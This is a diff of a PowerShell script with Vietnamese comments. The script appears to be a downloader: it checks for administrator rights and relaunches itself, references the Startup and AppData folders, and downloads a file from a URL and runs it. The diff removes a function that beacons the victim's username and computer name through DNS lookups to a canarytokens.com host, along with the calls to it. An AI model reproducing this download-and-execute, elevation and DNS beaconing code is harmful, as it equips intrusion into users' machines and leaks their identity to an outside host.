@@ -31,21 +31,6 @@ $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
 $startupfolder = $env:appdata
 Add-Type -AssemblyName System.Windows.Forms
 
-function Resolve-CanaryToken {
-    param (
-        [string]$id
-    )
-    
-    # Get sanitized username and computer name
-    $u = ("u$env:username" -replace '[^a-zA-Z0-9]', '')[0..63] -join ''
-    $c = ("c$env:computername" -replace '[^a-zA-Z0-9]', '')[0..63] -join ''
-    
-    # Construct the DNS query string with the provided ID
-    $dnsQuery = "$c.UN.$u.CMD.$id.extbjjvko3xxued68eptp7zuk.canarytokens.com"
-    
-    # Perform DNS resolution
-    Resolve-DnsName -Name $dnsQuery
-}
 
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -62,7 +47,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         
         # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
         Write-Output "Kết thúc tiến trình PowerShell."
-        Resolve-CanaryToken "rerunadmin"
         Stop-Process -Id $PID -Force
     }
     catch {
@@ -100,6 +84,5 @@ if (Test-Path -Path $output) {
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
     Start-Process $output
-    Resolve-CanaryToken "blank"
 }
 
